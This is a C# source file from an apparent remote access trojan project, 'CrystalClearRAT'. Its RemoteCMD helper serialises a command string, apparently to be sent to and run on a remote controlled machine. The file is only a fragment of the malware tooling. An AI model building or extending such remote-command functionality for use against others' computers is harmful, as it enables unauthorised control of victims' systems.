using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CrystalRATShared.Serialization;
using CrystalRATShared.Commands;

namespace CrystalClearRAT.Functions
{
    public static class RemoteCMD
    {

        public static byte[] Command(string command)
        {
            return CommandDataSerializer.Serialize(CommandFlags.RemoteCMD, (writer) =>
            {
                writer.Write(command);
            }
            );
        }


    }
}
